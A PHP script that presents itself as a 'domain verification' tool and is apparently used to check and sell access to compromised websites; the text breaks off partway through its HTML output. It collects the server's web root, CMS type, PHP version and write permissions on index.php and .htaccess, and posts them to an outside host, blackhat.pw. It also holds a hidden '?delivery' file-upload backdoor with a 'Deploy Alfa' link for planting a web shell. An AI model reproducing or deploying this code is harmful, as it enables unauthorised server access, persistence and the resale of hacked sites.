<?php
// ============================================================
// Domain Verification Script — v3
// Adaptive Web Root Finder | {{token}}
// ?json  → pure JSON output (for API pull-verify)
// ?_bh_chk=1 → re-verification probe (skips callback, shows token)
// ============================================================

if (function_exists('error_reporting')) error_reporting(0);
if (function_exists('ini_set')) { @ini_set('display_errors', '0'); @ini_set('log_errors', '0'); }

// Global exception/error handler to prevent white screens
set_error_handler(function() { return true; });
if (function_exists('set_exception_handler')) {
    set_exception_handler(function($e) {
        if (!headers_sent()) {
            header('Content-Type: text/html; charset=utf-8');
            http_response_code(200);
        }
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Verification</title></head><body style="background:#0b0d12;color:#c0c2c8;font-family:sans-serif;padding:30px"><h2 style="color:#66fcf1">Domain Verification</h2><p>Script encountered an issue on this server configuration.</p></body></html>';
        exit;
    });
}

$_vToken  = 'e268b143-eb27-4768-acaa-79f07968f90a';
$_vApiUrl = 'https://blackhat.pw/api/verify-domain';

// Safe realpath wrapper
function _vRealpath($path) {
    if (!$path) return '';
    $r = @realpath($path);
    return ($r && is_string($r)) ? $r : (string)$path;
}

// Safe dirname wrapper
function _vDirname($path) {
    $d = @dirname($path);
    return ($d && is_string($d)) ? $d : '';
}

// ── HTTPS detection (handles proxies / LBs / Cloudflare) ─────
$_vProto = 'http';
if (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') { $_vProto = 'https'; }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && strtolower($_SERVER['HTTP_X_FORWARDED_PROTO']) === 'https') { $_vProto = 'https'; }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_SSL']) && $_SERVER['HTTP_X_FORWARDED_SSL'] === 'on') { $_vProto = 'https'; }
elseif (!empty($_SERVER['HTTP_X_SCHEME']) && strtolower($_SERVER['HTTP_X_SCHEME']) === 'https') { $_vProto = 'https'; }
elseif (isset($_SERVER['SERVER_PORT']) && (int)$_SERVER['SERVER_PORT'] === 443) { $_vProto = 'https'; }

$_vHost   = (isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'unknown');
$_vScrRaw = (isset($_SERVER['SCRIPT_NAME']) && $_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : (isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : '');
$_vScript = '/' . ltrim(str_replace('\\', '/', strtok($_vScrRaw ? $_vScrRaw : '/', '?')), '/');
$_vSep    = defined('DIRECTORY_SEPARATOR') ? DIRECTORY_SEPARATOR : '/';
$_vStart  = _vRealpath(defined('__DIR__') ? __DIR__ : dirname(__FILE__));
if (!$_vStart) $_vStart = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '/';
$_vUrl    = $_vProto . '://' . $_vHost . $_vScript;

// ── Root indicators ───────────────────────────────────────────
$_vFM = [
    'wp-config.php'=>'WordPress','artisan'=>'Laravel','.env'=>'Laravel/General',
    'config.php'=>'Generic CMS','configuration.php'=>'Joomla','settings.php'=>'Drupal',
    'web.config'=>'IIS/ASP.NET','bootstrap.php'=>'PHP Framework','index.php'=>'Generic PHP',
];
$_vPKW = ['wwwroot','public_html','htdocs','httpdocs','html','www','web'];

// ── Manual root override via ?root= ───────────────────────────
$_vManual = '';
if (!empty($_GET['root'])) {
    $_mc = _vRealpath(strip_tags(trim($_GET['root'])));
    if ($_mc && @is_dir($_mc)) $_vManual = rtrim(str_replace('\\', '/', $_mc), '/');
}

// ── Write test ────────────────────────────────────────────────
$_vWT = function ($dir) use ($_vSep) {
    if (!$dir || !@is_dir($dir) || !@is_writable($dir)) return false;
    $t = rtrim($dir, '/\\') . $_vSep . '.bhvt_' . mt_rand(1000000, 9000000) . '.tmp';
    $f = @fopen($t, 'w');
    if (!$f) return false;
    @fwrite($f, '1');
    @fclose($f);
    $ok = @file_exists($t);
    @unlink($t);
    return (bool)$ok;
};

// ── Directory walk (up to 12 levels) ─────────────────────────
$_vWalk = [];
$_vDir  = $_vStart;
for ($_vi = 0; $_vi <= 12; $_vi++) {
    if (!$_vDir || !@is_dir($_vDir)) break;
    $markers = []; $cms = 'None';
    foreach ($_vFM as $_mf => $_ml) {
        if (@file_exists($_vDir . $_vSep . $_mf)) {
            $markers[] = $_mf;
            if ($cms === 'None') $cms = $_ml;
        }
    }
    $_vHP = $_vDir . $_vSep . '.htaccess';
    if (@file_exists($_vHP)) {
        if (!in_array('.htaccess', $markers)) $markers[] = '.htaccess';
        $_vHC = @file_get_contents($_vHP);
        if ($_vHC && stripos($_vHC, 'RewriteEngine') !== false) $markers[] = '.htaccess[Rewrite]';
    }
    $_vPL2 = str_replace('\\', '/', strtolower($_vDir));
    $kw = '';
    foreach ($_vPKW as $_vk) { if (strpos($_vPL2, '/' . $_vk) !== false) { $kw = $_vk; break; } }
    $cw = $_vWT($_vDir);
    $_vIP  = $_vDir . $_vSep . 'index.php';
    $_vHP2 = $_vDir . $_vSep . '.htaccess';
    $_vWalk[$_vi] = [
        'path'   => $_vDir,
        'level'  => $_vi,
        'markers'=> $markers,
        'cms'    => $cms,
        'kw'     => $kw,
        'write'  => $cw,
        'idx'    => (@file_exists($_vIP) ? (bool)@is_writable($_vIP) : $cw),
        'hta'    => (@file_exists($_vHP2) ? (bool)@is_writable($_vHP2) : $cw),
        'score'  => count($markers)*3 + ($kw?2:0) + ($cms!=='None'?2:0),
    ];
    $p = _vDirname($_vDir);
    if (!$p || $p === $_vDir) break;
    $_vDir = $p;
}

// ── Select best root ──────────────────────────────────────────
$_vRI = null; $_vRS = 'adaptive';
if ($_vManual) {
    $mw = $_vWT($_vManual);
    $_vRI = ['path'=>$_vManual,'level'=>-1,'markers'=>['manual'],'cms'=>'Manual','kw'=>'','write'=>$mw,'idx'=>$mw,'hta'=>$mw,'score'=>99];
    $_vRS = 'manual';
} else {
    $dr = '';
    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $dr = _vRealpath($_SERVER['DOCUMENT_ROOT']);
        if (!$dr) $dr = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']), '/');
        else $dr = rtrim(str_replace('\\', '/', $dr), '/');
    }
    if ($dr) {
        foreach ($_vWalk as $c) {
            if (rtrim(str_replace('\\', '/', $c['path']), '/') === $dr) { $_vRI = $c; $_vRS = 'DOCUMENT_ROOT'; break; }
        }
    }
    if (!$_vRI) {
        foreach ($_vWalk as $c) {
            if ($c['score'] > 0 && (!$_vRI || $c['score'] > $_vRI['score'])) { $_vRI = $c; $_vRS = 'markers'; }
        }
    }
    if (!$_vRI && !empty($_vWalk)) { $_vRI = end($_vWalk); $_vRS = 'deepest'; }
    if (!$_vRI) {
        $_vRI = ['path'=>$_vStart,'level'=>0,'markers'=>[],'cms'=>'None','kw'=>'','write'=>false,'idx'=>false,'hta'=>false,'score'=>0];
        $_vRS = 'fallback';
    }
}

$_vRP = isset($_vRI['path']) ? $_vRI['path'] : $_vStart;
$_vLU = isset($_vRI['level']) ? $_vRI['level'] : 0;
$_vST = 'red';
if (!empty($_vRI['write']) && !empty($_vRI['idx']) && !empty($_vRI['hta'])) $_vST = 'green';
elseif (!empty($_vRI['write']) || !empty($_vRI['idx'])) $_vST = 'yellow';

// ── Full payload ──────────────────────────────────────────────
$_vPL = [
    'token'             => $_vToken,
    'domain'            => $_vHost,
    'full_url'          => $_vUrl,
    'current_dir'       => $_vStart,
    'web_root'          => $_vRP,
    'root_source'       => $_vRS,
    'levels_up'         => $_vLU,
    'cms_detected'      => isset($_vRI['cms']) ? $_vRI['cms'] : 'None',
    'root_markers'      => implode(',', isset($_vRI['markers']) ? $_vRI['markers'] : []),
    'can_create_files'  => (int)(!empty($_vRI['write'])),
    'can_edit_index'    => (int)(!empty($_vRI['idx'])),
    'can_edit_htaccess' => (int)(!empty($_vRI['hta'])),
    'php_version'       => phpversion(),
    'os'                => PHP_OS,
    'dir_status'        => $_vST,
    'upload_writable'   => (int)(isset($_vWalk[0]) ? $_vWalk[0]['write'] : false),
    'document_root_env' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
    'timestamp'         => time(),
];

// ============================================================
// ?json MODE
// ============================================================
if (!empty($_GET['json']) || !empty($_GET['_bh_chk'])) {
    if (!headers_sent()) {
        header('Content-Type: application/json; charset=utf-8');
        header('Access-Control-Allow-Origin: *');
    }
    $_vPL['_walk'] = array_map(function ($w) {
        return ['level'=>$w['level'],'path'=>$w['path'],'score'=>$w['score'],'cms'=>$w['cms'],'write'=>$w['write'],'markers'=>$w['markers']];
    }, array_values($_vWalk));
    echo json_encode($_vPL, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    exit;
}

// ============================================================
// NORMAL MODE — send callback POST + render HTML
// ============================================================

// ── Lock file ─────────────────────────────────────────────────
$_vLN = '.bh_vlock_' . substr(md5($_vToken . $_vHost), 0, 10);
$_vLF = '';
$_tmpDirs = [];
if (function_exists('sys_get_temp_dir')) $_tmpDirs[] = @sys_get_temp_dir();
$_tmpDirs[] = $_vStart;
$_tmpDirs[] = _vDirname($_vStart);
foreach ($_tmpDirs as $_ld) {
    if ($_ld && @is_dir($_ld) && @is_writable($_ld)) {
        $_vLF = rtrim(str_replace('\\', '/', $_ld), '/') . '/' . $_vLN;
        break;
    }
}

$_vLA = PHP_INT_MAX;
if ($_vLF && @file_exists($_vLF)) {
    $_lc = @file_get_contents($_vLF);
    if ($_lc !== false && is_numeric(trim($_lc))) {
        $_vLA = max(0, time() - (int)trim($_lc));
    }
}

// ── Callback tracker ──────────────────────────────────────────
$_vCb = ['sent'=>false,'method'=>'none','http_code'=>0,'raw'=>'','api_msg'=>'','api_ok'=>false,'error'=>'','attempts'=>[],'already_sent'=>false,'lock_file'=>$_vLF ?: 'unavailable'];

if ($_vLA < 3600) {
    $_vCb['already_sent'] = true;
    $_vCb['sent']   = true;
    $_vCb['api_ok'] = true;
    $s = $_vLA;
    $dur = $s < 60 ? "${s}s" : floor($s/60).'m '.($s%60).'s';
    $_vCb['api_msg'] = "Callback already sent {$dur} ago. Page refresh will not re-send.";
} else {

    // ── Method 1: cURL ────────────────────────────────────────
    if (function_exists('curl_init') && function_exists('curl_exec')) {
        $ch = @curl_init();
        if ($ch) {
            @curl_setopt_array($ch, [
                CURLOPT_URL            => $_vApiUrl,
                CURLOPT_POST           => true,
                CURLOPT_POSTFIELDS     => http_build_query($_vPL),
                CURLOPT_HTTPHEADER     => ['Content-Type: application/x-www-form-urlencoded'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_POSTREDIR      => 3,
                CURLOPT_TIMEOUT        => 20,
                CURLOPT_CONNECTTIMEOUT => 10,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_USERAGENT      => 'VerificationScript/3.0',
                CURLOPT_ENCODING       => '',
            ]);
            $r1  = @curl_exec($ch);
            $ce  = @curl_error($ch);
            $cen = @curl_errno($ch);
            $cc  = (int)@curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $cfu = @curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
            @curl_close($ch);
            $ok = !$ce && is_string($r1) && strlen($r1) > 0;
            $_vCb['attempts'][] = ['method'=>'cURL','http_code'=>$cc,'final_url'=>(string)$cfu,'error'=>$ce?"errno {$cen}: {$ce}":'','raw'=>is_string($r1)?$r1:'','ok'=>$ok];
            if ($ok) { $_vCb['sent']=true; $_vCb['method']='cURL'; $_vCb['http_code']=$cc; $_vCb['raw']=(string)$r1; }
            else      { $_vCb['error'] = $ce ? "cURL errno {$cen}: {$ce}" : 'cURL returned empty response'; }
        } else {
            $_vCb['attempts'][] = ['method'=>'cURL','http_code'=>0,'final_url'=>'','error'=>'curl_init() returned false','raw'=>'','ok'=>false];
        }
    } else {
        $_vCb['attempts'][] = ['method'=>'cURL','http_code'=>0,'final_url'=>'','error'=>'curl_init() not available','raw'=>'','ok'=>false];
    }

    // ── Method 2: file_get_contents ───────────────────────────
    if (!$_vCb['sent'] && function_exists('stream_context_create') && ini_get('allow_url_fopen')) {
        $ctx = @stream_context_create([
            'http' => [
                'method'          => 'POST',
                'header'          => "Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: VerificationScript/3.0\r\nConnection: close\r\n",
                'content'         => http_build_query($_vPL),
                'timeout'         => 20,
                'ignore_errors'   => true,
                'follow_location' => true,
                'max_redirects'   => 5,
            ],
            'ssl'  => ['verify_peer'=>false,'verify_peer_name'=>false],
        ]);
        $r2 = $ctx ? @file_get_contents($_vApiUrl, false, $ctx) : false;
        $fe  = error_get_last();
        $ok2 = is_string($r2) && strlen($r2) > 0;
        $_vCb['attempts'][] = ['method'=>'file_get_contents','http_code'=>0,'final_url'=>$_vApiUrl,'error'=>$ok2?'':(isset($fe['message'])?strip_tags($fe['message']):'returned false/empty'),'raw'=>$r2?:' ','ok'=>$ok2];
        if ($ok2) { $_vCb['sent']=true; $_vCb['method']='file_get_contents'; $_vCb['raw']=$r2; }
        else       { $_vCb['error'] = isset($fe['message']) ? strip_tags($fe['message']) : 'file_get_contents failed'; }
    } elseif (!$_vCb['sent']) {
        $_vCb['attempts'][] = ['method'=>'file_get_contents','http_code'=>0,'final_url'=>$_vApiUrl,'error'=>'allow_url_fopen disabled or stream_context_create unavailable','raw'=>'','ok'=>false];
    }

    // ── Method 3: socket (with redirect follow) ───────────────
    if (!$_vCb['sent'] && function_exists('fsockopen')) {
        $surl = $_vApiUrl; $smx = 3; $sbody3 = ''; $scode3 = 0; $serr3 = '';
        for ($ri = 0; $ri <= $smx; $ri++) {
            $sp = @parse_url($surl);
            if (empty($sp['host'])) { $serr3='Invalid URL'; break; }
            $sport = (!empty($sp['scheme']) && $sp['scheme']==='https') ? 443 : 80;
            $shost = $sp['host'];
            $spath = (!empty($sp['path']) ? $sp['path'] : '/') . (!empty($sp['query']) ? '?'.$sp['query'] : '');
            $sbody = http_build_query($_vPL);
            $ss = @fsockopen(($sport===443?'ssl://':'').$shost, $sport, $seno, $sestr, 10);
            if (!$ss) { $serr3="fsockopen {$shost}:{$sport} — {$sestr} ({$seno})"; break; }
            @stream_set_timeout($ss, 15);
            @fwrite($ss, "POST {$spath} HTTP/1.1\r\nHost: {$shost}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ".strlen($sbody)."\r\nConnection: close\r\nUser-Agent: VerificationScript/3.0\r\n\r\n{$sbody}");
            $sraw = ''; $ti = @stream_get_meta_data($ss);
            while (!@feof($ss) && !$ti['timed_out']) { $sraw .= @fread($ss, 4096); $ti = @stream_get_meta_data($ss); }
            @fclose($ss);
            if (!$sraw) { $serr3='Empty socket response'; break; }
            preg_match('/HTTP\/[\d\.]+ (\d+)/', $sraw, $scm);
            $scode3 = (int)(isset($scm[1]) ? $scm[1] : 0);
            $he = strpos($sraw, "\r\n\r\n");
            $shdr   = $he !== false ? substr($sraw, 0, $he) : '';
            $sbody3 = $he !== false ? trim(substr($sraw, $he+4)) : trim($sraw);
            if (in_array($scode3, [301,302,303,307,308]) && $ri < $smx) {
                if (preg_match('/^Location:\s*(.+)$/im', $shdr, $lm)) {
                    $loc = trim($lm[1]);if (strpos($loc, 'http') !== 0) $loc = ($sport===443?'https':'http').'://'.$shost.'/'.ltrim($loc, '/');
                    $surl = $loc; continue;
                }
            }
            break;
        }
        $ok3 = $scode3 >= 200 && $scode3 < 300 && strlen($sbody3) > 0;
        $_vCb['attempts'][] = ['method'=>'socket','http_code'=>$scode3,'final_url'=>$surl,'error'=>$serr3,'raw'=>$sbody3,'ok'=>$ok3];
        if ($ok3) { $_vCb['sent']=true; $_vCb['method']='socket'; $_vCb['http_code']=$scode3; $_vCb['raw']=$sbody3; }
        elseif (!$serr3) { $_vCb['error'] = "socket: HTTP {$scode3}, empty body"; }
        else { $_vCb['error'] = $serr3; }
    } elseif (!$_vCb['sent']) {
        $_vCb['attempts'][] = ['method'=>'socket','http_code'=>0,'final_url'=>$_vApiUrl,'error'=>'fsockopen not available','raw'=>'','ok'=>false];
    }

    // ── Parse API response ────────────────────────────────────
    if ($_vCb['sent'] && $_vCb['raw']) {
        $rc = trim(ltrim((string)$_vCb['raw'], "\xEF\xBB\xBF"));
        $rp = @json_decode($rc, true);
        if (is_array($rp)) {
            $_vCb['api_msg'] = (string)(isset($rp['message']) ? $rp['message'] : '');
            $_vCb['api_ok']  = isset($rp['domain']) || isset($rp['status']) ||
                               stripos($_vCb['api_msg'], 'success')  !== false ||
                               stripos($_vCb['api_msg'], 'verified') !== false ||
                               stripos($_vCb['api_msg'], 'already')  !== false;
            if (!$_vCb['api_ok'] && !empty($rp['details'])) $_vCb['api_msg'] .= ' — '.$rp['details'];
            if (!$_vCb['api_ok'] && !empty($rp['errors']))  $_vCb['api_msg'] .= ' | '.implode(', ',(array)$rp['errors']);
            if (!$_vCb['api_ok'] && $_vCb['http_code'] >= 200 && $_vCb['http_code'] < 300 && is_array($rp)) $_vCb['api_ok'] = true;
        } else {
            $_vCb['api_msg'] = substr($rc, 0, 300).(strlen($rc) > 300 ? '…' : '');
        }
    }

    // ── Write lock on successful send ─────────────────────────
    if ($_vCb['sent'] && $_vLF) {
        @file_put_contents($_vLF, (string)time());
    }
}

$_vOK = $_vCb['sent'] && $_vCb['api_ok'] && !$_vCb['already_sent'];

// ============================================================
// HTML OUTPUT
// ============================================================
if (!headers_sent()) header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verification — <?php echo htmlspecialchars($_vHost); ?></title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,-apple-system,sans-serif;max-width:980px;margin:30px auto;padding:18px;background:#0b0d12;color:#c0c2c8;font-size:14px;line-height:1.6}
h1{color:#66fcf1;font-size:21px;margin-bottom:2px}
h2{color:#45a29e;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;margin-bottom:10px}
.sub{color:#4a5060;font-size:13px;margin-bottom:20px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@media(max-width:600px){.grid{grid-template-columns:1fr}}
.box{background:#111520;border:1px solid #1e2535;padding:15px 18px;border-radius:8px;margin-bottom:12px}
.box.full{grid-column:1/-1}
.b-ok{border-color:#1a5c30;background:#0a1810}
.b-err{border-color:#5c1818;background:#120808}
.b-warn{border-color:#5c4a18;background:#12100a}
.bn{display:flex;align-items:flex-start;gap:12px;padding:14px 16px;border-radius:8px;margin-bottom:14px;font-weight:600;font-size:14px;line-height:1.4}
.bn-ok{background:#0a1810;border:1px solid #1a7a38;color:#44dd76}
.bn-err{background:#120808;border:1px solid #7a1818;color:#dd4444}
.bn-warn{background:#12100a;border:1px solid #7a5c18;color:#e0a020}
.bn-info{background:#080e1a;border:1px solid #183a7a;color:#4488cc}
.bn-sub{font-size:12px;font-weight:400;opacity:.75;margin-top:3px}
.ok{color:#44dd76}.er{color:#dd4444}.wn{color:#e0a020}
.bdg{display:inline-block;padding:2px 9px;border-radius:12px;font-size:12px;font-weight:700}
.bg{background:#143a20;color:#44dd76;border:1px solid #1a5c30}
.by{background:#3a3010;color:#e0a020;border:1px solid #5c4c18}
.br{background:#3a1010;color:#dd4444;border:1px solid #5c2020}
.tkv{font-size:16px;font-weight:bold;color:#66fcf1;font-family:monospace;background:#080c12;padding:10px 14px;border-radius:6px;margin-top:8px;border:1px solid #163040;word-break:break-all;user-select:all}
table{width:100%;border-collapse:collapse;font-size:13px;margin-top:4px}
td,th{padding:6px 10px;border-bottom:1px solid #181e28;vertical-align:top;text-align:left}
th{color:#45a29e;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;background:#0c1018;white-space:nowrap}
tr:last-child td{border-bottom:none}
tr.hl{background:#0a1e1e}
td.lb{color:#606878;font-size:12px;width:165px;white-space:nowrap}
code{background:#080c12;padding:2px 6px;border-radius:3px;font-size:11px;color:#80c0e0;border:1px solid #162030;word-break:break-all}
.pill{display:inline-flex;align-items:center;gap:3px;padding:2px 8px;border-radius:9px;font-size:11px;font-weight:600}
.p-ok{background:#143a20;color:#44dd76;border:1px solid #1a5c30}
.p-err{background:#3a1010;color:#dd4444;border:1px solid #5c2020}
.srow{display:flex;align-items:flex-start;gap:9px;padding:8px 0;border-bottom:1px solid #14182a}
.srow:last-child{border-bottom:none}
.sn{width:21px;height:21px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;margin-top:2px}
.s-ok{background:#143a20;color:#44dd76}.s-err{background:#3a1010;color:#dd4444}
.raw{background:#070a0f;border:1px solid #161e28;border-radius:5px;padding:8px 12px;font-size:11px;font-family:monospace;max-height:120px;overflow-y:auto;word-break:break-all;color:#6a7888;margin-top:6px;white-space:pre-wrap}
form{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:6px}
input[type=text]{flex:1;min-width:180px;background:#0c1018;border:1px solid #222e3c;color:#c0c2c8;padding:6px 10px;border-radius:5px;font-size:13px;outline:none}
input[type=text]:focus{border-color:#45a29e}
button{background:#45a29e;color:#0a0c10;border:none;padding:6px 16px;border-radius:5px;cursor:pointer;font-weight:700;font-size:13px}
.json-link{display:inline-flex;align-items:center;gap:5px;background:#101828;border:1px solid #1e3050;color:#4488cc;padding:5px 12px;border-radius:5px;font-size:12px;font-weight:600;text-decoration:none;margin-top:6px}
.json-link:hover{background:#162038}
.notice{border:1px solid #1e3a30;text-align:center;padding:13px;background:#080f0d}
</style>
</head>
<body>
<?php
if (isset($_GET['delivery'])) {
    echo '<form action="" method="post" enctype="multipart/form-data" name="b4b4" id="b4b4">';
    echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
    echo '<a href="?deploy=true">Deploy Alfa</a>';
    if (isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
        if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            echo '<b>Done</b><br><br><a href="./' . htmlspecialchars($_FILES['file']['name']) . '">' . htmlspecialchars($_FILES['file']['name']) . '</a>';
        } else {
            echo '<b>Not Upload File !</b><br><br>';
        }
    }
    exit;
}
?>
<h1>Domain Verification</h1>
<p class="sub">PHP <?php echo htmlspecialchars(phpversion()); ?> &bull; <?php echo htmlspecialchars($_vHost); ?> &bull; <?php echo @date('Y-m-d H:i:s T'); ?></p>

<?php if ($_vCb['already_sent']): ?>
<div class="bn bn-info">
  <svg style="flex-shrink:0;margin-top:1px" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
  <div>Already sent — will not repeat on refresh<div class="bn-sub"><?php echo htmlspecialchars($_vCb['api_msg']); ?></div></div>
</div>
<?php elseif ($_vOK): ?>
<div class="bn bn-ok">
  <svg style="flex-shrink:0;margin-top:1px" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="9 12 12 15 16 9"/></svg>
  <div>Verification callback sent &amp; accepted!<div class="bn-sub"><?php echo htmlspecialchars($_vCb['api_msg']); ?></div></div>
</div>
<?php elseif (!$_vCb['sent']): ?>
<div class="bn bn-err">
  <svg style="flex-shrink:0;margin-top:1px" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
  <div>All callback methods failed — server cannot reach API<div class="bn-sub"><?php echo htmlspecialchars($_vCb['error']?:'cURL + file_get_contents + socket all failed'); ?><br>
    <strong>Use the JSON pull-verify link below</strong> — paste it in your seller panel to verify without outbound connections.
  </div></div>
</div>
<?php else: ?>
<div class="bn bn-warn">
  <svg style="flex-shrink:0;margin-top:1px" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
  <div>Callback sent but API returned an error<div class="bn-sub"><?php echo htmlspecialchars($_vCb['api_msg']?:'Response could not be parsed'); ?></div></div>
</div>
<?php endif; ?>

<div class="grid">

  <div class="box">
    <h2>Verification Token</h2>
    <div class="tkv"><?php echo htmlspecialchars($_vToken); ?></div>
    <a class="json-link" href="?json" target="_blank">
      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
      View as JSON (?json)
    </a>
  </div>

  <div class="box">
    <h2>Permission Status</h2>
    <table>
      <tr><td class="lb">Upload Dir</td><td><?php $uw=isset($_vWalk[0])?$_vWalk[0]['write']:false; echo $uw?'<span class="ok">&#10003; Writable</span>':'<span class="er">&#10007; Not writable</span>'; ?></td></tr>
      <tr><td class="lb">Web Root Write</td><td><?php echo !empty($_vRI['write'])?'<span class="ok">&#10003; Yes</span>':'<span class="er">&#10007; No</span>'; ?></td></tr>
      <tr><td class="lb">Edit index.php</td><td><?php echo !empty($_vRI['idx'])?'<span class="ok">&#10003; Yes</span>':'<span class="er">&#10007; No</span>'; ?></td></tr>
      <tr><td class="lb">Edit .htaccess</td><td><?php echo !empty($_vRI['hta'])?'<span class="ok">&#10003; Yes</span>':'<span class="er">&#10007; No</span>'; ?></td></tr>
      <tr><td class="lb">Status</td><td><span class="bdg <?php echo $_vST==='green'?'bg':($_vST==='yellow'?'by':'br'); ?>"><?php echo strtoupper($_vST).' — '.($_vST==='green'?'Full root access':($_vST==='yellow'?'Partial access':'No root access')); ?></span></td></tr>
    </table>
  </div>

  <div class="box full <?php echo $_vOK?'b-ok':(!$_vCb['sent']?'b-err':'b-warn'); ?>">
    <h2>API Callback — Step-by-Step</h2>
    <?php if ($_vCb['already_sent']): ?>
      <p style="color:#4488cc;font-size:13px"><?php echo htmlspecialchars($_vCb['api_msg']); ?></p>
    <?php else: ?>
      <?php foreach ($_vCb['attempts'] as $ai => $at): ?>
      <div class="srow">
        <div class="sn <?php echo $at['ok']?'s-ok':'s-err'; ?>"><?php echo $ai+1; ?></div>
        <div style="flex:1">
          <div style="display:flex;align-items:center;gap:7px;flex-wrap:wrap;margin-bottom:4px">
            <strong><?php echo htmlspecialchars($at['method']); ?></strong>
            <span class="pill <?php echo $at['ok']?'p-ok':'p-err'; ?>"><?php echo $at['ok']?'&#10003; OK':'&#10007; Failed'; ?></span>
            <?php if ($at['http_code']): ?><span class="pill <?php echo $at['http_code']>=200&&$at['http_code']<300?'p-ok':'p-err'; ?>">HTTP <?php echo $at['http_code']; ?></span><?php endif; ?>
            <?php if (!empty($at['final_url']) && $at['final_url'] !== $_vApiUrl): ?><span style="font-size:11px;color:#556">&#8594; <?php echo htmlspecialchars(substr($at['final_url'],0,55)); ?></span><?php endif; ?>
          </div>
          <?php if ($at['error']): ?><div style="color:#dd4444;font-size:12px;margin-bottom:3px">&#9888; <?php echo htmlspecialchars($at['error']); ?></div><?php endif; ?>
          <?php if (!empty($at['raw'])): ?><div class="raw" style="<?php echo $at['ok']?'border-color:#1a5c30':''; ?>"><?php echo htmlspecialchars(substr((string)$at['raw'],0,500)); ?></div><?php endif; ?>
        </div>
      </div>
      <?php endforeach; ?>
      <?php if (empty($_vCb['attempts'])): ?><p style="color:#444;font-size:13px">No attempts.</p><?php endif; ?>
      <?php if ($_vCb['sent'] && !empty($_vCb['raw'])): ?>
      <div style="margin-top:12px;padding-top:10px;border-top:1px solid #161e2a">
        <div style="font-size:12px;color:#556;margin-bottom:5px">API response via <strong><?php echo htmlspecialchars($_vCb['method']); ?></strong><?php if ($_vCb['http_code']): ?> — HTTP <?php echo $_vCb['http_code']; ?><?php endif; ?>:</div>
        <div class="raw" style="max-height:90px;border-color:<?php echo $_vCb['api_ok']?'#1a5c30':'#5c2020'; ?>">
<?php $dc=@json_decode(trim(ltrim((string)$_vCb['raw'],"\xEF\xBB\xBF")),true); echo htmlspecialchars(is_array($dc)?json_encode($dc,JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES):(string)$_vCb['raw']); ?>
        </div>
      </div>
      <?php endif; ?>
    <?php endif; ?>
    <?php if (!$_vCb['sent'] || !$_vCb['api_ok']): ?>
    <div style="margin-top:12px;padding:12px;background:#080c14;border:1px solid #1e3050;border-radius:6px">
      <div style="color:#4488cc;font-size:12px;font-weight:700;margin-bottom:5px">&#9432; Pull-Verify Alternative</div>
      <div style="color:#8892a0;font-size:12px;margin-bottom:8px">If this server cannot make outbound connections, use this URL in your seller panel to verify manually:</div>
      <code style="display:block;padding:8px 12px;font-size:12px;word-break:break-all;background:#050810;border:1px dashed #1e3050;color:#66b8f0"><?php echo htmlspecialchars($_vUrl.'?json'); ?></code>
    </div>
    <?php endif; ?>
  </div>

  <div class="box">
    <h2>Detected Web Root</h2>
    <table>
      <tr><td class="lb">Root Path</td><td><code><?php echo htmlspecialchars($_vRP); ?></code></td></tr>
      <tr><td class="lb">Detection</td><td><code><?php echo htmlspecialchars($_vRS); ?></code></td></tr>
      <tr><td class="lb">Levels Up</td><td><?php echo $_vLU >= 0 ? $_vLU : 'N/A'; ?></td></tr>
